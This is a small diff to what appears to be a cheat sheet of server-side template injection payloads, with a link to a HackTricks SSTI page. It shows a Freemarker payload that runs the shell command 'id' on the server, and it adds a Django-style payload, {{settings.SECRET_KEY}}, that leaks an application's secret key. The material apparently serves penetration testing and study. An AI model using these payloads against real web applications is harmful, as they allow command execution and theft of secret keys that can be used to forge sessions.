@@ -621,6 +621,10 @@ ${{3*3}}
 
 \<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 
+### Python - Secret Key
+  
+{{settings.SECRET_KEY}}
+  
 ### Doc for SSTI	
 
 https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
